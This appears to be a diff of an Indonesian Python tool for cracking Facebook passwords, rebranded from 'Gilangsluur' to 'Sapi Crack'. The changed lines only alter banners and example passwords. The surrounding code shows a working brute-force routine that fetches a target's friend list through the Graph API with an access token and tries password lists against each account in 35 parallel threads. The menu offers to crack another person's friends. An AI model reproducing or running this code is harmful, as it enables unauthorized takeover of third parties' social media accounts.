@@ -118,7 +118,7 @@ class gas:
                     try:
                         for pw in memek:kirim.submit(self.crack,uid,pw)
                     except:pass
-        print('\n### [CRACK FINISHED] ###')
+        print('\n### [UDAH SELESAI] ###')
     def get2(self):
         print('\n\t[ Crack ID Teman Atau Publik ]\n')
         target=input('Masukan ID Target: ')
@@ -137,7 +137,7 @@ class gas:
         print('[+] Jumlah Teman:',str(len(id)))
         memek=input("[?] Pwlist Manual y/t : ")
         if(memek in ("y","Y")):
-            print("\nContoh (by1 dek)")
+            print("\nContoh (anjing,bangsat,monyet)")
             pwList=input("[+] Masukan Password : ").split(",")
             with Bool(max_workers=35) as kirim:
                 print('\n[+] Starting Crack...\n--------------------------------\n')
@@ -161,7 +161,7 @@ class gas:
                         for pw in memek:
                             kirim.submit(gas(self.token).crack,uid,pw)
                     except:pass
-        print('\n### [CRACK FINISHED] ###')
+        print('\n### [UDAH SELESAI] ###')
     def ua(self):
         print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
         a=input('[?] Ganti useragent y/t: ')
@@ -178,7 +178,7 @@ class gas:
         name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
         os.system('clear')
         cowsay.cow(f'Hallo: {name} :)\nYour IP: {ip}')
-        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\trecode : Gilangsluur Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
+        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tSapi Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
         p=input('[+] Chosee: ')
         if(p in ('01','1')):self.get1()
         elif(p in ('02','2')):self.get2()
